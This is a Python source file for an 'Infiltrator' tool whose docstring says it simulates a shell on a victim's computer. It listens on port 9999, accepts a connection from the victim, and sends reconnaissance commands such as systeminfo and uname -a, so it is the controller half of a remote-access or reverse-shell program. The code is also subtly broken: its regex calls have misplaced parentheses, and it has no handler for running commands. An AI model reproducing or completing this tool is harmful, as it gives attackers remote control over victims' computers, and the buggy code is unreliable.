#!/usr/bin/python3
# -*- coding: utf-8 -*-

import responses
import protocol
import re
import utils
import cmd
from packets import *
from socket_api import SocketApi

class Infiltrator(cmd.Cmd):
    """The class to simulate a shell on victim's computer."""
    def __init__(self, socket_api):
        """
        Construct the Infiltrator object.

        :param socket_api: The SocketApi object.
        :return: The Infiltrator object.
        """
        if type(socket_api) is not SocketApi:
            raise TypeError('The socket_api must be a SocketApi object, not {}'.format(socket_api.__class__.__name__))
        self.__socket = socket_api
        self.response_handler = responses.ResponseHandler()
        self._sysinfo = self.__get_sysinfo()
        self.compatible = OSCompatible(self._sysinfo['OS'])
        self.__get_prompt()
        self.show_sysinfo()

    def show_sysinfo(self):
        """Send the system info to user output."""
        self.__socket.send(Packet(content=self.compatible.sysinfo()))
        packet = self.response_handler.handle(self.__socket.recv())
        print(packet.content)

    def do_exit(self, *args):
        """Close connection and exit."""
        self.__socket.close()
        return True

    def __get_prompt(self):
        """Get the working directory where socket is running."""
        # Send the working directory command.
        self.__socket.send(Packet(content=self.compatible.working_directory()))

        # Handle the socket response.
        packet = self.response_handler.handle(self.__socket.recv())
        if packet is None:
            raise Exception('Error when trying to discover the working directory.')
        self.prompt = packet.content.strip()

    def __get_sysinfo(self):
        """
        Get the system info from connected computer.

        :return: A dictionary with system information.
        """
        # Send a packet to get system information. The GET_INFO code should be handled
        # to get system info from python modules.
        self.__socket.send(Packet(code=protocol.GET_INFO))
        packet = self.response_handler.handle(self.__socket.recv())
        if packet is None:
            raise Exception('Failed to obtain computer system info.')
        params = packet.params
        return {'OS': params['system'][0], 'VERSION': params['version'][0], 'COMPUTER': params['node'][0], 'PROCESSOR': params['machine'][0]}

class OSCompatible(object):
    """The class to run compatible commands on diferent operational systems."""

    LINUX = 1
    WINDOWS = 2

    def __init__(self, os):
        """
        Construct the OSCompatible object.

        :param os: The operational system.
        :return: The OSCompatible object.
        """
        # Define the working operational system. The operational system will be the point to handle
        # commands through the diferent supported operational systems.
        self.os = self.determine_os(os)

    def working_directory(self):
        """
        Get the working directory of the operational system.

        :return: The proper command.
        """
        if self.os is self.WINDOWS:
            return 'cd'
        return 'pwd'

    def sysinfo(self):
        """
        Get the system information.

        :return: The proper command.
        """
        if self.os is self.WINDOWS:
            return 'systeminfo'
        return 'uname -a'

    def determine_os(self, os):
        """
        Determine the operational system from a given string that should be obtained from computer system info.

        :param os: The operational system string.
        """
        if len(re.findall(r'windows'), os, flags=re.IGNORECASE) > 0:
            # Windows system found.
            return self.WINDOWS

        if len(re.findall(r'linux'), os, flags=re.IGNORECASE) > 0:
            # Linux system found.
            return self.LINUX

        raise UnsupportedOS(os)

class UnsupportedOS(Exception):
    def __init__(self, os):
        self.os = os

    def __repr__(self):
        return str('The provided operational system is not supported. OS: {}'.format(self.os))

if __name__ == '__main__':
    from socket_factory import SocketFactory
    from socket_api import SocketApi
    server = SocketFactory.server(port=9999)
    socket = SocketApi(server.accept()[0])
    Infiltrator(socket).cmdloop()
